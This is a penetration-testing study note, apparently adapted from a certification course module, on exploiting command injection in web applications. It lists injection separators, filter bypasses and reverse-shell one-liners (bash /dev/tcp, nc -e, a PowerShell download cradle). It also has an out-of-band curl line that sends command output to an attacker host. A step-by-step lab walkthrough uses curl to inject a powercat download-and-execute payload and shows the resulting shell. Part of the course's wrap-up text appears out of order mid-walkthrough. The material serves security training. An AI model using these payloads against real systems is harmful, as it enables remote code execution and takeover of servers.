---
tags:
  - command-injection
  - phase/exploitation
  - rce
  - web
---

# Command Injection

> [!tip] Quick Reference — Command Injection
> | OS | Separator | Example |
> |----|-----------|---------|
> | Linux | `;` | `127.0.0.1; id` |
> | Linux | `&&` | `127.0.0.1 && id` |
> | Linux | `\|\|` | `127.0.0.1 \|\| id` |
> | Linux | `` ` `` | `` `id` `` |
> | Linux | `$()` | `$(id)` |
> | Windows | `&` | `127.0.0.1 & whoami` |
> | Windows | `\|` | `127.0.0.1 \| whoami` |
> | Both | `%0a` | URL-encoded newline |

## Decision Tree

```
Input reflected in a system command?
├── Identify OS
│   ├── Linux: cat /etc/passwd, id, uname -a
│   └── Windows: whoami, systeminfo, ipconfig
│
├── Try injection separators
│   ├── ; id          (Linux)
│   ├── & whoami      (Windows)
│   ├── | whoami      (both)
│   └── %0a id        (URL-encoded newline — bypasses some filters)
│
├── Execution confirmed → get reverse shell
│   ├── Linux bash
│   │   └── bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
│   ├── Linux netcat
│   │   └── nc -e /bin/bash <LHOST> <LPORT>
│   └── Windows PowerShell
│       └── powershell -c "iex(iwr http://<LHOST>/powercat.ps1);powercat -c <LHOST> -p <LPORT> -e cmd"
│
├── Filter in place?
│   ├── Spaces blocked → use ${IFS} or tabs (%09)
│   ├── Words blocked → use env vars: ${PATH:0:1} = /
│   └── Burp Intruder with command injection wordlist
│
└── Blind injection? (no output)
    ├── Time-based: ; sleep 5
    ├── OOB: ; curl http://<LHOST>/?$(id)
    └── Write file: ; echo test > /var/www/html/test.txt
```

## Visual Flow

```mermaid
flowchart TD
    A["Find input used in a system command<br/>e.g. Archive parameter"] --> B["Inject a separator + test command"]
    B --> C{"Did the extra command run?"}
    C -->|No| D["Try other separators<br/>%3B semicolon, && , one & , backtick<br/>see Encoding Reference"]
    C -->|Yes| E["Detect OS and shell<br/>git version, CMD vs PowerShell snippet"]
    D --> C
    E --> F["Host powercat.ps1 with python3 http.server<br/>start nc listener"]
    F --> G["Inject download cradle + powercat reverse shell"]
    G --> H["🐚 Reverse shell as the web user"]
```

> [!success] What success looks like
> Your injected command runs alongside the intended one. For example `git%3Bipconfig` returns the Windows IP configuration, and the PowerShell snippet prints `PowerShell`. The final payload lands a reverse shell in your Netcat listener showing a prompt like `PS C:\Users\Administrator\Documents\meteor>`.

> [!danger] Common errors
> - "command injection attempt detected" → a filter blocks bare commands; keep the allowed word (e.g. `git`) and chain yours after a separator like `%3B`.
> - Special characters break the request → URL-encode them (`;` = `%3B`, space = `%20`, `&` = `%26`). See [[🔣 Encoding Reference]].
> - Wrong separator for the OS → Linux uses `;`, `&&`, `||`; Windows CMD uses `&`. If one is filtered, try another.
> - No reverse shell despite RCE → confirm your `python3 -m http.server` shows the GET for powercat.ps1 and that `nc -nvlp 4444` is listening before you fire the payload.
> Full list: [[⚠️ Common Errors & Troubleshooting]]

> [!tip] Beginner note
> Command injection means the website passes your input straight to the operating system's shell. A separator like `;` tells the shell "now run a second command" — so you smuggle your own command in after the one the app expected.

## Resources
- [HackTricks — Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayloadsAllTheThings — CMDi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [revshells.com](https://www.revshells.com) — reverse shell generator


Web applications often need to interact with the underlying operating system, such as when a file is created through a file upload mechanism. Web applications should always offer specific APIs or functionalities that use prepared commands for the interaction with the system

> [!info] Spotting the injection point
> The app lets you clone a git repo by submitting a `git clone <URL>` string — the same command you'd type at a shell. That is a strong hint the input is passed to the OS shell, so we may be able to inject our own commands. Submitting a valid clone returns "Repository successfully cloned with command: git clone ... and output: ...", confirming the input is executed on the system.

Furthermore, the actual command is displayed in the web application's output. Let's try to inject arbitrary commands such as ipconfig, ifconfig, and hostname with curl. We'll switch over to HTTP history in Burp to understand the correct structure for the POST request. The request indicates the "Archive" parameter is used for the command.

> [!info] Reaching the parameter with curl
> Burp's HTTP history shows the git command travels in the `Archive` parameter of the POST request. We can drive it directly with `curl` (`-X POST` to set the method, `--data` to set the body). Submitting a bare `ipconfig` is rejected as a "command injection attempt" — a filter is in place, so we'll backtrack from a known-good input (`git`) to find a bypass.

```sh
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
```

> [!info] Fingerprinting via git
> Submitting bare `Archive=git` returns the git usage/help page, proving we aren't limited to `git clone` — any git subcommand runs. Adding a subcommand like `git version` confirms arbitrary git execution and reveals the OS: Git for Windows reports a version string containing `windows` (e.g. `git version 2.35.1.windows.2`), whereas Linux shows a plain version.

```sh
curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
```


> [!info] Chaining commands past the filter
> The filter only accepts input starting with `git`, so keep `git` and append your command after a separator. A URL-encoded semicolon (`%3B`) chains commands in both Bash and PowerShell; `&&` runs two consecutive commands, and a single `&` works in Windows CMD. `Archive=git%3Bipconfig` runs git and then `ipconfig`, returning the Windows IP configuration.

```sh
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

The output shows that both commands were executed. We can assume that there is a filter in place checking if "git" is executed or perhaps contained in the "Archive" parameter. Next, let's find out more about how our injected commands are executed. We will first determine if our commands are executed by PowerShell or CMD. In a situation like this, we can use a handy snippet, published by PetSerAl that displays "CMD" or "PowerShell" depending on where it is executed.

```sh
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```


```sh
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```

The output contains "PowerShell", meaning that our injected commands are executed in a PowerShell environment.

Next, let's try to leverage command injection to achieve system access. We will use Powercat to create a reverse shell. Powercat is a PowerShell implementation of Netcat included in Kali. Let's start a new terminal, copy Powercat to the home directory for the kali user, and start a Python3 web server in the same directory.
[https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)
With our web server serving powercat.ps1 and Netcat listener in place, we can now use curl in the first terminal to inject the following command. It consists of two parts delimited by a semicolon. The first part uses a PowerShell download cradle to load the Powercat function contained in the powercat.ps1 script from our web server. The second command uses the powercat function to create the reverse shell with the following parameters: -c to specify where to connect, -p for the port, and -e for executing a program.










9.5. Wrapping up
In this Module, we covered a variety of different common web application attacks. First, we explored how to display the contents of files outside of the web root with directory traversal attacks. Next, we used file inclusion to not only display the contents of files, but to also execute files by including them within the web application's running code. We then abused file upload vulnerabilities with executable and non-executable files. Finally, we learned how to leverage command injection to get access to a web application's underlying system.

Understanding these kinds of attacks will prove extremely helpful in any kind of security assessment. When we exploit them in publicly accessible web applications over the internet, they may lead us to an initial foothold in the target's network. Alternatively, when we find vulnerabilities for these attacks in internal web services, they may provide us with lateral movement vectors. While the vulnerabilities are not dependent on specific programming languages or web frameworks, their exploitation may be. Therefore, we should always take the time to briefly understand the web technologies being used before we attempt to exploit them. With the skills covered in this Learning Unit, we can identify and exploit a broad variety of web applications.

```sh
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -nvlp 4444
```


```sh
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```


```sh
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```


> [!info] Landing the shell
> The Python web server logs a `GET /powercat.ps1 200` (the target pulled the script), and the Netcat listener catches the connection back:
> ```
> connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
> PS C:\Users\Administrator\Documents\meteor>
> ```
> You now have a PowerShell reverse shell as the web user. Powercat is one option; you could also inject a PowerShell reverse shell one-liner directly. Exploitation always depends on the target OS, the app, and any security controls in place.

---
%% graph-links %%
## Related
- [[Local file inclusion (LFI)]]
- [[PHP wrappers]]
- [[Using executable files]]
- [[Enumerating and Abusing APIs]]

> [!info] Navigation
> Section: [[Web Applications/Common Web Application Attacks/_index|Common Web Application Attacks]] · Home: [[🏠 Home]]

